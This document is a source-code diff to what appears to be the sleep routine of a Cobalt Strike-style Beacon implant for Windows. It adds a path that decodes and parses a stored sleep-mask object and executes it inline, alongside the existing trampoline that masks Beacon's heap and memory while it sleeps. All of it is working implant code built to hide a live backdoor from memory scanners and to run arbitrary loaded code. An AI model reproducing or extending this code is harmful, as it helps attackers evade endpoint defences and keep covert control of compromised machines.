@@ -1,9 +1,12 @@
 /* gargle! */
+#include <winsock2.h>
 #include <windows.h>
 #include <intrin.h>
 #include "beacon.h"
 #include "gargleint.h"
 #include "track_memory.h"
+#include "datastore.h"
+#include "parse.h"
 
 
 typedef void(*GARGLEF)(GARGLEP * parms, void (__stdcall *Sleep)(DWORD), DWORD time);
@@ -116,21 +119,37 @@ static void setup_trampoline2() {
 
 void GargleSleep(DWORD time) {
 	GARGLEF func;
+	char decoded[16384];
+	int dlen;
 
 	if (setting_int(SETTING_GARGLE_NOOK) == 0 || threadcount > 0) {
 		Sleep(time);
+		return;
 	}
-	else {
-		/* create our trampoline, please */
-		setup_trampoline2();
 
-		/* cast our trampoline to our function */
-		func = (GARGLEF)gtrampoline;
-
-		/* get the heap sections to mask in case new items have been added. */
-		gparms->heap_records = track_memory_get_heap_records_to_mask();
-
-		/* stomp on our Beacon data */
-		func(gparms, Sleep, time);
+	dlen = sleepmask_decode(decoded, (int)sizeof(decoded));
+	if (dlen > 16) {
+		datap parser;
+		DWORD entry;
+		int prefix;
+		DWORD be_time;
+		data_init(&parser, decoded, dlen);
+		data_int(&parser);
+		data_extract(&parser);
+		data_extract(&parser);
+		data_extract(&parser);
+		data_extract(&parser);
+		data_extract(&parser);
+		data_extract(&parser);
+		prefix = dlen - parser.length;
+		entry = data_int(&parser);
+		be_time = htonl(time);
+		command_inline_execute_object_parsed(decoded, prefix, entry, (char *)&be_time, (int)sizeof(be_time));
+		return;
 	}
+
+	setup_trampoline2();
+	func = (GARGLEF)gtrampoline;
+	gparms->heap_records = track_memory_get_heap_records_to_mask();
+	func(gparms, Sleep, time);
 }
